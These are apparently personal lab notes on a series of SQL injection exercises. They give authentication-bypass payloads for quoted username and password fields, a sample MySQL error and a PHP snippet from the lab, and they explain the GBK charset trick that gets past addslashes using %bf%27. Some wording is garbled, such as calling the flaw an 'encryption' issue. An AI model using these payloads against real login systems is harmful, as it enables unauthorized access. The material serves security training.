SQL INJECTION - 01
-Sql injection comes from a encryption/escaping of user supplied input when included in SQL queries.

Based on how the user supplied input is added to the sql queries, you will need different things to break the syntax. There are three different ways to echo information in an sql query.
i) Using quotes: single quote(') or double quote(")
ii) Using backticks(`)
iii)Directly

QUERY: SELECT * FROM user WHERE login ='[user]' and PASSWORD='[password]'
LAB:
Tried with the single quote(') in the username field, the application throws the following error:
ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' and password=md5('')' at line 1

The payload will be added to the sql query as below:
Select * FROM user WHERE login='admin'OR1=1--'' and PASSWORD='password'
Here the payload will be admin'OR1=1--'

The payload here is admin'or1=1--'
                    admin' or '1'='1'
                    admin' or '1'='1'---'
CODE REVIEW:
<?php
    session_start(); starting the session
    if (!isset($_SESSION['user'])) {
        header("Location: /login.php");
        die();
    }

    require "header.php";
?>

<div class="row">
    <div class="col-lg-12">
        <h1>SQL Injection 01</h1>
        <span class="text text-success">
            You are currently logged in! The key for this exercise is 
            <b><?php echo htmlentities(getenv("PTLAB_KEY")); ?></b>.
        </span>
    </div>
</div>


SQL INJECTION - 02
In this case, the double quote is being used in the user input. EX admin will become "admin" in the query.
Using Double quotes(") to echo the SQL statement.
The payloads will be:
                     admin" OR 1=1--"
                     admin' OR "1"="1"--"
                     admin' OR "1"="1
These are the payloads for the username field.
The payloads for the password field would be as follows:
                     ") OR 1=1-- 
                     ") OR ("1"="1")
                     ") OR ("1"="1

SQL INJECTION - 03
admin'  OR '1'='1'--'
		 admin' OR 1=1--'

SQL INJECTION - 04
NO SPACE ERROR
Modify the payload so that there is no space in the payload.

SQL INJECTION - 05
admin'OR1=1--
admin'OR1=1#

SQL INJECTION - 06
This example was first published in 2006 on Chris Shiflett's Blog as a way to bypass addslashes. 
It relies on the way MySQL will perform escaping. It will depend on the charset used by the connection. 
If the database driver is not aware of the charset used it will not perform the right escaping and create an exploitable situation. 
This exploit relies on the usage of GBK. GBK is a character set for simplified Chinese. 
Using the fact that the database driver and the database don't "talk" the same charset, it's possible to generate a single quote and break out of the SQL syntax to inject a payload.
Using the string \xBF' (URL-encoded as %bf%27), it's possible to get a single quote that will not get escaped properly. 
It's therefore possible to inject an always-true condition using %bf%27 or 1=1 -- and bypass the authentication.

As a side note, this issue can be remediated by setting up the connection encoding to 'GBK' instead of using an SQL query (which is the source of this issue). Here the problem comes from the execution of the following query:

	SET CHARACTER SET 'GBK';

It is a pretty unlikely issue for a web application but it's always good to know that it exists, especially if you play CTFs.














                



